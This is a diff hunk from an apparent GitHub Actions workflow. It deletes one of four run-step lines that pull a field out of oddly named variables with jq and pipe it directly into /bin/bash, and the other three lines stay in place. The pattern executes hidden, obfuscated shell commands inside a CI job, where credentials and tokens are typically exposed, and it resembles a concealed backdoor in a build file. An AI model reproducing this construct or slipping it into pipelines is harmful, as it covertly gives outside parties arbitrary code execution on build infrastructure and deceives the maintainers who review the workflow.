@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$mbe2801" | jq -r .yk1540 | /bin/bash
           printf '%s' "$wx109" | jq -r .ecnk24 | /bin/bash
           echo $jt91 | jq -r .nomk94663 | /bin/bash
-          printf '%s' "$lzwk3" | jq -r .epwbe40 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
